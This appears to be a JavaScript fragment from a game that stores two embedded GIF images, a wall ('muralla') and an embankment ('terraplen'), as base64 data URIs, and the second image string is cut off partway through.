	imagenes["muralla"] = 'data:image/gif;base64,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';
	imagenes["terraplen"] = 'data:image/gif;base64,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